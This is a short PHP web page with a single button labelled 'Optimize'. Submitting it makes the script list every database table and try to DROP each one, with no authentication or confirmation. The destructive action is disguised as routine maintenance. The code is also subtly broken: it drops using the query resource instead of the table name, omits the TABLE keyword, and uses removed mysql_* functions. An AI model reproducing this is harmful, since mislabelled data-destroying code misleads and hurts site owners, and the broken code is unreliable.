<?php
if(!defined('mainload')) { define('mainload','ITSHIJAB',true); }
include_once('../config.php');
include_once('../classes.php');

if(!empty($_REQUEST['direction']) && $_REQUEST['direction'] == "drop"){ 
	$tbl_list = mysql_query("SHOW tables");
	while($dt_tbl = mysql_fetch_array($tbl_list)){
		echo $dt_tbl[0]."<br>";
		mysql_query("DROP ".$tbl_list[0]);
	}
}

?>
<form id="form1" name="form1" method="post" action="">
  <button type="submit" name="direction" value="drop">Optimize</button>
</form>
